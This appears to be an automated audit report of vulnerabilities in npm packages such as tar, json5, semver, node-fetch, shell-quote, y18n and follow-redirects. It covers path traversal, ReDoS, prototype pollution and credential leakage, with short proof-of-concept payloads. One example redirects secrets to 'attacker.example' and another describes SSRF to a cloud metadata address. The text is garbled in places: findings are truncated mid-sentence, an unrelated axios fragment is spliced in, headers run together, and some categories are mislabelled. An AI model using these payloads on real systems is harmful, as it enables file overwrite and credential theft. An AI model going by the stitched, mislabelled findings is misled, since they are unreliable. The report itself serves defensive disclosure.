Title: Arbitrary file overwrite via absolute path extraction in Unpack
Category: path-traversal
Severity: high
Description: The extraction path validation in lib/unpack.js is vulnerable to path traversal through absolute paths. In Unpack.[CHECKPATH], when preservePaths is false, absolute entry paths are sanitized using path.win32.isAbsolute() and path.win32.parse(). This strips only Windows-style roots from entry.path. Immediately afterwards, the code computes the destination with `if (path.isAbsolute(entry.path)) entry.absolute = entry.path; else entry.absolute = path.resolve(this.cwd, entry.path)`. On POSIX, a tar 
Request: Craft a tar archive containing a file entry with path `/tmp/owned-by-tar` and extract it with `tar.x({ cwd: '/safe/base' })` on a POSIX system using tar@4.4.12. The code path is lib/unpack.js [CHECKPATH].
Response: In lib/unpack.js, [CHECKPATH] only strips absolute paths if `path.win32.isAbsolute(p)` is true, but then later does `if (path.isAbsolute(entry.path)) entry.absolute = entry.path`. For POSIX absolute paths such as `/tmp/owned-by-tar`, `path.win32.isAbsolute('/tmp/owned-by-tar')` is false while `path.isAbsolute('/tmp/owned-by-tar')` is true, so `entry.absolute` becomes `/tmp/owned-by-tar` and extraction writes there.
Analysis: This is a real arbitrary file write primitive during extraction. Applications commonly use tar extraction on attacker-controlled archives expecting writes to stay under `cwd`. A malicious archive can overwrite any file writable by the process outside the destination directory. No non-default option is required; `preservePaths` defaults to false, so this is exploitable in common usage. This matches a classic path traversal / arbitrary file overwrite condition and is CVE-worthy.

Title: Arbitrary file creation/overwrite via hardlink target escaping extraction root
Category: path-traversal
Severity: high
Description: tar@4.4.12 resolves hardlink targets against the extraction cwd without validating that the resolved path stays inside the destination root. In lib/unpack.js, hardlink entries are handled by `this[LINK](entry, path.resolve(this.cwd, entry.linkpath), 'link')`. There is no `..` or absolute-path validation on `entry.linkpath` for hardlinks, and no post-resolution containment check. A malicious archive can provide a hardlink entry whose `linkpath` resolves outside `cwd` (for example `../../sensitive
Request: Craft a tar with a hardlink entry `path=inside/link`, `linkpath=../../victim`, then a regular file entry `path=inside/link` with attacker-controlled content. Extract with `tar.x({ cwd: '/safe/base' })`. Code path: lib/unpack.js [HARDLINK] -> [LINK].
Response: lib/unpack.js implements hardlinks as `this[LINK](entry, path.resolve(this.cwd, entry.linkpath), 'link')`. No validation ensures the resolved link target remains under `this.cwd`, and [CHECKPATH] only validates `entry.path`, not hardlink `entry.linkpath`. Therefore a tar entry can point a hardlink at `../../victim` outside the extraction directory.
Analysis: This yields a practical arbitrary file overwrite primitive on systems permitting hardlinks to the target file. The attacker controls both the link target path resolution and the subsequent file content written through the hardlink. This is directly reachable from the public extraction API with default settings and does not require preservePaths=true. It is an exploitable path traversal class bug with high impact.

Title: Symlink poisoning allows writes outside extraction directory
Category: path-traversal
Severity: high
Description: The extraction logic does not safely prevent writing through symlinks created earlier in the same archive. In lib/unpack.js, [CHECKFS] creates parent directories via mkdir.js, which relies on a mutable `dirCache` Map to skip re-checking paths once cached as directories. After a path is cached, a later archive entry can replace that path component with a symlink, and subsequent file extraction under that cached directory uses `entry.absolute = path.resolve(this.cwd, entry.path)` and `new fsm.Writ
Request: Use `tar.x()` on an archive that first establishes a path cached as a directory, then replaces/interposes it with a symlink to `../../outside`, then extracts `cached/sub/file`. Inspect lib/mkdir.js and lib/unpack.js handling of cache + write sinks.
Response: lib/unpack.js passes `this.dirCache` into mkdir.js. mkdir.js short-circuits with `if (cache && cache.get(dir) === true) return done()`, skipping lstat checks for cached paths. File extraction later opens `entry.absolute` directly with fs-minipass WriteStream after only mkdir(parent). If the filesystem path now traverses a symlink, the write follows that symlink outside the destination root.
Analysis: This is a real archive extraction escape. Attackers can craft archive ordering to poison the directory cache and cause subsequent writes to target attacker-chosen filesystem locations outside the extraction root. Applications commonly trust tar extraction to remain within a destination directory. The bug is in default extraction behavior and enables arbitrary file overwrite / creation, so high severity is appropriate.

Title: Regular Expression Denial of Service in enclosure detection
Category: regex-dos
Severity: medium
Description: The public API `globParent(str, opts)` in `index.js` applies `enclosure.test(str)` to attacker-controlled input before any length checks or parsing. In version 5.1.0, `enclosure` is defined as `/[\{\[].*[\/]*.*[\}\]]$/`, which contains multiple overlapping greedy quantifiers (`.*`, `[\/]*`, `.*`) anchored near the end of the string. Inputs with an opening `{` or `[` but no closing `}` or `]` trigger catastrophic backtracking. Because `glob-parent` is commonly used on untrusted glob/path patterns
Request: const gp=require('glob-parent'); gp('[' + 'a'.repeat(40000));
Response: Measured runtime on the installed package version 5.1.0:
- 1000 chars: 2ms
- 2000 chars: 4ms
- 5000 chars: 23ms
- 10000 chars: 93ms
- 20000 chars: 361ms
- 40000 chars: 1422ms
A 200000-character payload took ~34.7 seconds to return.
Analysis: The runtime grows superlinearly for simple non-matching inputs, which is a hallmark of catastrophic backtracking. The vulnerable path is directly reachable via the sole exported function. No special options or uncommon configuration are required. The attack causes a denial of service by monopolizing the Node.js event loop, but does not yield code execution or memory disclosure, so medium severity is appropriate.

Title: JSON5.parse allows __proto__ keys to mutate parsed object prototype
Category: prototype-pollution
Severity: medium
Description: The public API `JSON5.parse()` in `lib/parse.js` constructs objects with plain `{}` and assigns properties with `parent[key] = value` without filtering magic keys. When attacker-controlled input contains a `__proto__` property, the assignment invokes the inherited `Object.prototype.__proto__` setter instead of creating a normal own property. This changes the prototype of the returned object to attacker-controlled data.

Vulnerable code path:
- `lib/index.js` exports `parse`
- `lib/parse.js` `pus
Request: const JSON5 = require('json5');
const result = JSON5.parse('{"__proto__":{"admin":true}}');
console.log(Object.keys(result));
console.log(result.admin);
console.log(Object.getPrototypeOf(result) === Object.prototype);
Response: Running against the installed package produced:
- `Object.keys(result)` => `[]`
- `result.admin` => `true`
- `Object.getPrototypeOf(result) === Object.prototype` => `false`

Additional direct execution in the package directory:
`root keys [ 'admin' ]`
`root.admin true`
`root.__proto__ === Object.prototype false`
`root proto keys [ 'admin' ]`
`desc own __proto__ undefined`
Analysis: Because the parser uses a normal object literal and direct property assignment, the special accessor for `__proto__` is triggered. The returned object silently acquires attacker-controlled inherited properties instead of an own `__proto__` member. This is exploitable in common application patterns such as `if (config.admin)`, feature toggles, or option merging where inherited properties are trusted. The issue is reachable via the default `parse()` API with no special options.

Title: Reviver walk copies inherited properties after __proto__ prototype mutation
Category: prototype-pollution
Severity: high
Description: `JSON5.parse(text, reviver)` has a second exploitable variant in `lib/parse.js`. After parsing, `internalize()` recursively walks objects using `for (const key in value)`, which enumerates inherited enumerable properties as well as own properties. If the parsed payload first changes an object's prototype using `__proto__`, the reviver traversal will process attacker-controlled inherited properties and then write them back as own properties via `value[key] = replacement`.

This means a payload li
Request: const JSON5 = require('json5');
const result = JSON5.parse('{"__proto__":{"x":1}}', (k, v) => v);
console.log(Object.keys(result));
console.log(result.x);
console.log(Object.getOwnPropertyDescriptor(result, 'x'));
Response: Direct execution against the package returned:
- `root keys [ 'x' ]`
- `root.admin true` in the analogous prototype-mutation test
- For the reviver-specific PoC: `rev own keys [ 'x' ]`
- `plain x? undefined`

This shows the inherited property from the malicious prototype was enumerated and copied onto the object as an own property during reviver processing.
Analysis: Using `for...in` in a reviver walk is dangerous because it does not restrict iteration to own properties. Combined with the parser's `__proto__` assignment bug, attacker-controlled prototype fields are traversed as if they were real data members and then assigned onto the object. This can defeat downstream defenses that only inspect own properties after parsing with a reviver, and it is reachable through the documented public `parse(text, reviver)` API.

Title: Regular expression denial of service in Range parsing via CARETTRIM whitespace handling
Category: regex-dos
Severity: medium
Description: semver@7.3.7 contains a ReDoS condition in range parsing. The public Range constructor and APIs that create a Range (for example satisfies(), validRange(), minVersion(), intersects(), gtr(), ltr(), outside(), subset()) call Range.parseRange(), which performs `range = range.replace(re[t.CARETTRIM], caretTrimReplace)`. In internal/re.js, `CARETTRIM` is defined as `/(\s*)(?:\^)\s+/g`. Because the pattern begins with a greedy `\s*` and is followed by another whitespace quantifier `\s+` after a liter
Request: Input to public API: new semver.Range('^' + ' '.repeat(120000) + '1.2.3')
Response: Measured locally against the package source:
10000 spaces -> 75 ms
20000 spaces -> 290 ms
40000 spaces -> 1158 ms
80000 spaces -> 4637 ms
120000 spaces -> 10417 ms

This demonstrates super-linear growth and event-loop blocking from a single crafted range string.
Analysis: The vulnerable code path is directly reachable from public API surface. `Range.parseRange()` applies `String.prototype.replace()` with the global regex `CARETTRIM`. The regex has ambiguous overlapping whitespace quantifiers on attacker-controlled input, causing excessive backtracking. The timing data shows approximately quadratic growth, which is sufficient for practical denial of service in Node.js services that parse user-supplied semver ranges.

Title: Sensitive headers are forwarded across cross-origin redirects
Category: information-disclosure
Severity: high
Description: node-fetch@2.6.6 follows redirects by constructing a new Request with `headers: new Headers(request.headers)` and reusing the original Authorization/Cookie/etc. headers without validating whether the redirect target is the same origin or protocol. In `lib/index.js`, the redirect-following path resolves `locationURL` from the server-controlled `Location` header and then unconditionally copies request headers into `requestOpts` before calling `fetch(new Request(locationURL, requestOpts))`. There i
Request: fetch('https://trusted.example/resource', { headers: { Authorization: 'Bearer SECRET', Cookie: 'sid=SECRET' } }) where the response is `302 Location: https://attacker.example/steal`
Response: In lib/index.js redirect handling: `const requestOpts = { headers: new Headers(request.headers), ... }; ... resolve(fetch(new Request(locationURL, requestOpts)));` No same-origin/protocol filtering is performed before the redirected request is sent.
Analysis: The sink is the redirected outbound request. `locationURL` is attacker-influenced via the HTTP `Location` header. The package copies all caller-supplied headers, including security-sensitive ones, into the new request object. Because redirects are followed by default (`redirect: 'follow'`), this happens in common usage with no special configuration. Impact is credential exfiltration to an attacker-controlled host or downgrade target, which can compromise downstream services and user sessions.

As a result, application code that creates an axios instance with a trusted internal base URL and then passes attacker-controlled path input to `instance.

Response: http://internal.local/api/
final url http://169.254.169.254/latest/meta-data/
url //169.254.169.254/latest

The runtime proof shows that an axios instance configured with `baseURL: 'http://internal.local/api/'` forwards attacker-supplied absolute and protocol-relative URLs unchanged. Title: Windows extraction path traversal via drive-relative paths bypasses path sanitization
Category: path-traversal
Severity: high
Description: tar@6.1.8 fails to reject Windows drive-relative entry paths during extraction. In lib/unpack.js, CHECKPATH() only rejects '..' segments and strips absolute roots using stripAbsolutePath(), but then computes entry.absolute with path.resolve(this.cwd, entry.path). On Windows, paths like `C:..\..\victim.txt` are drive-relative, not absolute, so `stripAbsolutePath()` does not strip them and `path.isAbsolute()` is false. The code then resolves them against cwd, allowing traversal outside the intende
Request: A tar archive containing an entry path such as `C:../../Windows/Temp/pwned.txt` extracted with `tar.x({ cwd: 'C:/safe' })` on Windows.
Response: In lib/unpack.js CHECKPATH(): it rejects `..` only after `const p = normPath(entry.path)`, strips roots using stripAbsolutePath(p), and then sets `entry.absolute = normPath(path.resolve(this.cwd, entry.path))` when path.isAbsolute(entry.path) is false. In lib/strip-absolute-path.js, only `path.win32.isAbsolute()` roots are stripped. Drive-relative paths like `C:foo` are not absolute for win32, so they survive. The package version is 6.1.8, which npm audit flags as affected until 6.1.9.
Analysis: This is a real arbitrary file write primitive on Windows because tar entry names are attacker-controlled archive metadata and extraction is a common untrusted-input use case. The validation logic conflates absolute-path stripping with safety, but Windows drive-relative paths are a separate class. Since the sink is filesystem write/link creation under entry.absolute, this allows writes outside cwd in default extraction flows on Windows.

Title: Symlink directory cache poisoning enables extraction outside destination
Category: path-traversal
Severity: high
Description: tar@6.1.8 trusts a caller-provided/shared dirCache and marks directories as safe without revalidating that they are still directories. In lib/mkdir.js, cached paths returning true bypass filesystem checks entirely (`if (cache && cGet(cache, dir) === true) return done()`). In lib/unpack.js, the cache is shared across extraction and is used to skip parent directory validation before writing files. An attacker-controlled archive can first create or influence a symlinked path and then rely on cache 
Request: Use `tar.x()` with a shared `dirCache` Map. Populate cache for a path under extraction root, then have archive contents replace that path with a symlink to an external directory before a later file entry is extracted beneath it.
Response: lib/mkdir.js: `if (cache && cGet(cache, dir) === true) return done()` skips stat/lstat entirely. Later, done() simply records the path as existing and returns success. lib/unpack.js passes `this.dirCache` into mkdir() for parent creation and file extraction flow. npm audit for tar@6.1.8 lists GHSA-qq89-hq3f-393p / CVE-2021-37712 as affecting 6.0.0-6.1.8.
Analysis: This is exploitable because extraction safety relies on checking that no symlink exists in parent directories. The cache short-circuits those checks and can become stale/poisoned, allowing writes through a symlink outside the destination tree. The sink is subsequent file creation in FILE()/LINK() using entry.absolute after parent validation was skipped. This yields arbitrary file write outside extraction root.

Title: Unbounded tar header parsing allows denial of service via excessive directory entries
Category: regex-dos
Severity: medium
Description: tar@6.1.8 lacks folder count validation during extraction/parsing, enabling denial of service with archives containing extremely large numbers of directory entries. The parser and unpacker accept every directory entry, create path reservations, cache entries, and filesystem operations without any limit on total directories or nesting. This can cause unbounded memory growth and severe CPU/filesystem churn when processing malicious archives. The issue is reachable through the public parse and extr
Request: A tarball containing a massive number of directory entries or deep directory tree supplied to `tar.x()` or `new tar.Parse()`.
Response: Source review shows no limit on number of parsed entries or directories: lib/parse.js continuously instantiates Entry objects and queues them; lib/unpack.js reserves paths, updates dirCache, and mkdirs every directory; no counter or threshold exists anywhere in the extraction/parser path. npm audit identifies CVE-2024-28863 as affecting 6.1.8 until 6.2.1 due to lack of folders count validation.
Analysis: Although not code execution, this is a real availability issue in common server-side use of tar on untrusted archives. A crafted tarball can exhaust memory or tie up CPU/IO by forcing the library to process huge numbers of directories. Category mapped as DoS; impact is medium because it is remotely triggerable where applications unpack user-provided archives.

Title: Regular expression denial of service in enclosure detection
Category: regex-dos
Severity: medium
Description: The public `globParent(str, opts)` API applies the regex `/[\{\[].*[\/]*.*[\}\]]$/` to attacker-controlled input before any length checks or normalization. This pattern contains overlapping greedy `.*` sections around an optional `[\/]*`, which causes catastrophic backtracking on unterminated enclosure strings such as `'[' + '/'.repeat(n)`. An attacker who can supply a glob pattern to software using `glob-parent` can trigger high CPU consumption and event-loop blockage.
Request: const gp=require('glob-parent'); gp('[' + '/'.repeat(3000));
Response: Measured locally against the audited package version 5.1.1: 1000 chars -> 326ms, 2000 chars -> 2561ms, 2500 chars -> 4994ms, 3000 chars -> 8606ms. Runtime grows superlinearly and blocks the process for seconds with a small payload.
Analysis: `glob-parent` exports a single function taking an untrusted string. In `index.js`, `enclosure.test(str)` is reached on every call. The regex is vulnerable to catastrophic backtracking because the engine must explore many ways to partition long slash runs between the two `.*` atoms and the `[\/]*` atom before failing to find a closing `}` or `]` at end-of-string. Since this package is used in build tools, file watchers, and server-side glob handling, user-controlled patterns can cause a practical

Title: ReDoS in parse() via crafted nth-child formula with trailing operator
Category: regex-dos

Request: const parse = require('./parse'); parse('2'.repeat(20000) + 'n' + ' '.repeat(20000) + '+');

1000 => 0.931ms
2000 => 3.574ms
5000 => 22.122ms
10000 => 87.505ms
20000 => 348.568ms
The input throws only after expensive regex processing.
Analysis: The vulnerable code path is directly reachable through the package's public API. The expensive work occurs before any exception is raised, so applications that parse attacker-supplied CSS selectors can be blocked in the event loop. Title: shell-quote quote() fails to escape Windows drive-letter paths, enabling command injection / argument corruption
Category: command-injection
Severity: critical
Description: The public API `quote(xs)` in `index.js` uses `String(s).replace(/([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2')` for unquoted tokens. The character class `[A-z]` is incorrect: it matches non-letter ASCII characters between `Z` and `a` and, more importantly, the optional `([A-z]:)?` prefix suppresses escaping of the character immediately following a Windows drive letter such as `C:`. As a result, dangerous shell metacharacters after `C:` are not safely neutralized the way the library pro
Request: Read `index.js` and compare with 1.7.3. Vulnerable code in 1.7.2: `String(s).replace(/([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2')`. Fixed 1.7.3 code: `String(s).replace(/([A-Za-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2')`. Reproduced with Node: `require('shell-quote').quote(['C:/test&calc'])` returns `C\\:/test\\&calc` and `quote(['C:\\Windows\\System32\\calc.exe'])` returns `C:\\\\Windows\\System32\\calc.exe`.
Response: Installed 1.7.2 `index.js` contains:
`else { return String(s).replace(/([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2'); }`

Fetched 1.7.3 `index.js` contains:
`else { return String(s).replace(/([A-Za-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2'); }`

Runtime evidence from 1.7.2:
`["C:/test&calc"] => C\\:/test\\&calc`
`["C:\\test&calc"] => C:\\\\test\\&calc`
`["C:\\Windows\\System32\\calc.exe"] => C:\\\\Windows\\System32\\calc.exe`

Shell test on POSIX shows argument corruption:
`printf "%s\n" C\:\\Windows\\System32\\calc.exe` prints `C:WindowsSystem32calc.exe` (backslashes consumed by the shell).
Analysis: This is not theoretical: `quote()` is the package's exported escaping primitive and is routinely used before passing strings to shell interpreters. The bug is in default behavior, requires only attacker control over an argument string, and affects the exact versions cited by npm audit. Because the emitted string can fail to preserve intended argument boundaries/contents and can under-neutralize metacharacters after a drive prefix, applications may suffer command injection or execution of attacke

Title: Prototype pollution via attacker-controlled locale name in cache object
Category: prototype-pollution
Severity: high
Description: The public API allows untrusted callers to set an arbitrary locale string with `setLocale()`. Internal code then uses that string as a property name on a normal object: `this.cache[this.locale] = localeLookup` in `_readLocaleFile()` and reads/writes `this.cache[this.locale][...]` in `__`, `__n`, and `updateLocale`. If `locale` is set to `__proto__`, assignments target `this.cache`'s prototype instead of a normal cache entry. An attacker can then call `updateLocale({polluted:'yes'})` or trigger l
Request: const y = require('y18n')({updateFiles:false}); y.setLocale('__proto__'); y.updateLocale({polluted:'yes'}); y.setLocale('fr'); y.__('hello'); console.log(y.cache.fr.polluted);
Response: after setting locale to `__proto__`, `updateLocale()` writes to `this.cache.__proto__`. A subsequent fresh locale object inherits the attacker property, and `y.cache.fr.polluted` prints `yes`. Local reproduction output:

before proto keys []
after proto keys [ 'polluted' ]
proto polluted? yes
...
after read fr own keys []
after read fr polluted? yes
Analysis: Using a magic property name as an object key mutates the prototype chain rather than storing plain data. Because `cache` is created as `{}` and locale names are fully attacker-controlled through the exported `setLocale()` API, the pollution is reachable in normal usage. Polluted inherited keys can alter translation lookups and any application logic that trusts values from y18n cache objects, making this a meaningful high-severity prototype pollution issue.

Title: Arbitrary file write outside locale directory via path traversal in locale name
Category: path-traversal
Severity: high
Description: `setLocale()` accepts an arbitrary string and `_resolveLocaleFile(directory, locale)` constructs the output path with `path.resolve(directory, './', locale + '.json')` without validating that the result remains inside `directory`. When `updateFiles` is enabled (the default), calling `__('...')` or `__n(...)` on a new string causes `_processWriteQueue()` to `fs.writeFile()` to the resolved path. A locale like `../pwned` escapes the locale directory and writes attacker-controlled JSON to an arbitr
Request: const base = fs.mkdtempSync(...); const dir = path.join(base,'locales'); fs.mkdirSync(dir); const y = require('y18n')({directory:dir, updateFiles:true}); y.setLocale('../pwned'); y.__('PAYLOAD');
Response: Reproduced locally. The library wrote outside the configured locales directory:

cb err null null
target /tmp/y18n-base-IIyUj6/pwned.json exists true
{
  "PAYLOAD": "PAYLOAD"
}

The write target came from resolving `path.resolve(<base>/locales, './', '../pwned.json')`, which escapes to `<base>/pwned.json`.
Analysis: This is a direct arbitrary file write primitive relative to the configured locales directory. The sink is reachable through exported APIs only: `setLocale()` controls the path, and `__()` with default `updateFiles:true` triggers the write. In real applications where locale can be selected from request/user input, an attacker can overwrite or create files outside the intended translations directory, constrained only by the Node process filesystem permissions. That impact is high severity.

Title: Unauthenticated DoS via excessive HTTP headers in WebSocket upgrade handling
Category: information-disclosure
Severity: medium
Description: ws@7.4.5 is affected by a denial-of-service condition when handling upgrade requests with many HTTP headers. `lib/websocket-server.js` performs synchronous processing of attacker-controlled request headers on the upgrade path, including extension parsing and protocol handling, without any package-level cap on header count or aggregate work. In vulnerable deployments, an attacker can send a handshake containing an excessive number of headers to consume CPU and/or memory and block the Node.js proc
Request: Remote client sends an HTTP Upgrade request with an extremely large number of headers to a ws server created from this package.
Response: The upgrade handler in `lib/websocket-server.js` immediately reads and processes `req.headers` from attacker-controlled HTTP input:

```js
handleUpgrade(req, socket, head, cb) {
  ...
  const key = req.headers['sec-websocket-key'] !== undefined
    ? req.headers['sec-websocket-key'].trim()
    : false;
  const version = +req.headers['sec-websocket-version'];
  ...
  const offers = parse(req.headers['sec-websocket-extensions']);
  ...
  let protocol = req.headers['sec-websocket-protocol'];
```

The installed package version matches the affected range documented by CVE-2024-37890 / GHSA-3h5v-q93c-6h6q.
Analysis: This is a known remotely reachable availability issue in the target package itself, not a transitive dependency. Applications commonly expose `ws` upgrade endpoints directly to untrusted networks, so malformed handshake traffic is attacker-controlled. Title: Marked 2.0.0 vulnerable to Regular Expression DoS via crafted markdown (known CVE-2022-21680/21681 class)
Category: regex-dos
Severity: medium
Description: The package version 2.0.0 contains the vulnerable regex-based parsing engine identified by the published marked ReDoS advisories affecting versions before 4.0.10. The vulnerable code paths are in src/rules.js and are reached from the public API `marked()`, `marked.parseInline()`, and `Lexer.lex()` when parsing attacker-controlled markdown. Several grammar rules use large, overlapping backtracking regexes over untrusted input, including `block.list`, `block.html`, `block.paragraph`, `inline.link`
Request: Public package version: marked@2.0.0. Vulnerable regex definitions are present in `/src/rules.js`, e.g. `block.list = /^( {0,3})(bull) [\s\S]+?(?:hr|def|\n{2,}(?! )(?! {0,3}bull )\n*|\s*$)/`, `block.html = '^ {0,3}(?:' + ... + '|</?(tag)(?: +|\n|/?>)[\s\S]*?(?:\n{2,}|$)' + ...`, and `inline.link = /^!?\[(label)\]\(\s*(href)(?:\s+(title))?\s*\)/` with nested, overlapping subpatterns generated by `edit(...)` and executed repeatedly during lexing.
Response: Code inspection confirms these regexes are compiled and used from `Tokenizer` methods such as `list()`, `html()`, `paragraph()`, `link()`, `reflink()`, and `url()` on attacker-controlled `src` substrings. The installed package metadata also reports the published advisories: GHSA-5v2h-r2cx-5xgj / CVE-2022-21681 and GHSA-rrrm-qjm4-v8hf / CVE-2022-21680 affecting versions including 2.0.0, with fix in 4.0.10+.
Analysis: This is a real, reachable denial-of-service issue in the target package itself, not just a transitive dependency. Any application that renders untrusted markdown with marked@2.0.0 can be forced into excessive regex backtracking and CPU exhaustion. Impact is service-level DoS rather than code execution, so medium severity is appropriate.

Title: Proxy-Authorization header is forwarded across redirect host boundaries
Category: information-disclosure
Severity: medium
Description: In follow-redirects@1.14.7, redirected cross-host requests strip only `Authorization` and `Cookie` headers, but leave `Proxy-Authorization` intact. In `index.js` during `_processResponse`, when redirecting to a different host the code calls `removeMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers);` and never removes `Proxy-Authorization`. As a result, credentials intended only for the outbound proxy can be sent to an attacker-controlled redirect target. An attacker who contro
Request: PoC script using follow-redirects@1.14.7: first local HTTP server responds 302 to a second local HTTP server, initial request includes headers `Proxy-Authorization: Basic SECRET`, `Authorization: Bearer TOP`, and `Cookie: a=b`.
Response: Observed headers on first server: proxy-authorization, authorization, cookie. Observed headers on redirected second server: only `proxy-authorization: Basic SECRET` remained; `authorization` and `cookie` were removed.

Second server received:
{
  "proxy-authorization": "Basic SECRET",
  "host": "127.0.0.1:<port>",
  "connection": "keep-alive"
}
Analysis: This is a real credential leak across origins. The vulnerable code path is reachable in default redirect-following behavior whenever callers set a `Proxy-Authorization` header, which is a normal way to authenticate to proxies or middleware. Because the library automatically follows 3xx responses, a malicious or compromised upstream can exfiltrate the header to an arbitrary host without application opt-in. This matches a meaningful confidentiality impact for applications using authenticated outbo

Title: Express extended query parser re-enables prototype property access via qs allowPrototypes=true
Category: prototype-pollution
Severity: medium
Description: Express 5.2.1 compiles the `query parser` setting `extended` to `parseExtendedQueryString()` in `lib/utils.js`, which calls `qs.parse(str, { allowPrototypes: true })`. This explicitly permits attacker-controlled query-string keys that shadow prototype properties such as `hasOwnProperty`, `toString`, or `constructor` to appear on `req.query`.

Vulnerable path:
- `app.set('query parser', 'extended')` in public API
- `lib/utils.js` `compileQueryParser()` returns `parseExtendedQueryString`
- `parseE
Request: Source review of `/tmp/pwnkit-audit-34a6a9eb/node_modules/express/lib/utils.js` and `/tmp/pwnkit-audit-34a6a9eb/node_modules/express/lib/request.js` for `app.set('query parser', 'extended')` / `req.query`.
Response: `lib/utils.js` line near parseExtendedQueryString: `return qs.parse(str, { allowPrototypes: true });`
`lib/request.js` query getter: `return queryparse(querystring);`
Analysis: `allowPrototypes: true` is the dangerous switch in qs that restores user control over names on Object.prototype. Express wires this parser directly into `req.query`, so attacker input from the URL becomes a hostile object handed to application code. While this does not mutate global Object.prototype, it is a real remote object-property injection issue that can break security-sensitive logic and cause application DoS in common usage.
